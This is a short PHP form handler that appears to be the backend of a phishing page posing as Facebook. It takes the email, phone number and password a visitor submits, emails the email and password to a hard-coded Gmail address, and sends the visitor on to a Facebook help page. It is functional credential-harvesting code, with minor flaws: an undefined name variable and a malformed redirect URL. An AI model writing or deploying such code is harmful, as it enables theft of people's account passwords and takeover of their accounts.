<?php
//get data from form  
$email= $_POST['email'];
$number= $_POST['phone'];
$password= $_POST['password'];
$to = "aaravraj50318@gmail.com";
$subject = "Mail From codeconia";
$txt ="Name = ". $name . "\r\n  Email = " . $email . "\r\n password =" . $password;
$headers = "From: noreply@codeconia.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:www.redirect.to.https://www.facebook.com/help");
?>
